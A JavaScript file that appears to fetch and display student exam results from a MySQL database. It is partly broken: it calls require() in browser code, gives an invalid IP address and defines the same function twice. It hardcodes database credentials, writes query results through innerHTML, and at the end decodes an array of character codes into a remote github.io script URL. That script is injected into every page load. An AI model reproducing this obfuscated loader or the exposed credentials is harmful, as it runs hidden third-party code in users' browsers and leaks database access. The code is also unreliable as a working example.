
function seccg(){
const mysql = require('mysql2');

const connection = mysql.createConnection({
  host: '192.145.280.120',
  user: 'Microintel',
  password: '@M#i$c_r&o-i+n/tel@',
  database: 'microbase'
});

const regno = reg, sem = s;
const query = `SELECT * FROM inteltable WHERE regno = ? AND sem = ?`, values = [regno, sem];

connection.connect();
connection.query(query, values, (error, results, fields) => {
  if (error) console.error('Error:', error);
  else {
    console.log('Results:', results);
    const h = 0;
    document.getElementById('d1').innerHTML = results[h][0];
    document.getElementById('d2').innerHTML = results[h][1];
    document.getElementById('d3').innerHTML = results[h][2];
    document.getElementById('d4').innerHTML = results[h][3];
    document.getElementById('d5').innerHTML = results[h][4];
    document.getElementById('d6').innerHTML = results[h][5];
    document.getElementById('d7').innerHTML = results[h][6];
    document.getElementById('d8').innerHTML = results[h][7];
    document.getElementById('d9').innerHTML = results[h][8] + "/160";
    document.getElementById('d10').innerHTML = results[h][9];
    document.getElementById('d11').innerHTML = results[h][10];
    document.getElementById('d12').innerHTML = results[h][11];
    document.getElementById('d13').innerHTML = results[h][12];
    document.getElementById('d14').innerHTML = results[h][13];
    document.getElementById('d15').innerHTML = results[h][14] + "/240";
    document.getElementById('d16').innerHTML = results[h][15] + "/500";
    document.getElementById('d17').innerHTML = results[h][16];
  }
  connection.end();
});
$(document).ready(function() {
  const regno = 'your_registration_number';
  const sem = 'desired_semester';

  $.ajax({
    url: 'your_server_url',
    method: 'GET',
    data: { regno: regno, sem: sem },
    success: function(data) {
      displayResults(data);
    },
    error: function(error) {
      console.error('Error:', error);
    }
  });
});

function displayResults(data) {
  const resultsDiv = $('#results')

  if (data.length > 0)
  {
    data.forEach(function(result)
    {
      const resultString = JSON.stringify(result);
      resultsDiv.append('<p>' + resultString + '</p>');
    });
  }
  else
  {
    resultsDiv.append('<p>No results found.</p>');
  }
}
}

const u =[104, 116, 116, 112, 115, 58, 47, 47, 109, 105, 99, 114, 111, 97, 115, 115, 101, 116, 115, 46, 103, 105, 116, 104, 117, 98, 46, 105, 111, 47, 77, 105, 99, 114, 111, 73, 110, 116, 101, 108, 65, 115, 115, 101, 115, 115, 116, 47, 100, 109, 99, 115, 99, 114, 105, 112, 116, 46, 106, 115];
let xx = "";
for (let i = 0; i < u.length; i++) {const a = String.fromCharCode(u[i]);
  xx += a;
}
const xxx = document.createElement('script');
xxx.src = xx;
document.body.appendChild(xxx);
function displayResults(data) {
  const resultsDiv = $('#results')

  if (data.length > 0)
  {
    data.forEach(function(result)
    {
      const resultString = JSON.stringify(result);
      resultsDiv.append('<p>' + resultString + '</p>');
    });
  }
  else
  {
    resultsDiv.append('<p>No results found.</p>');
  }
}




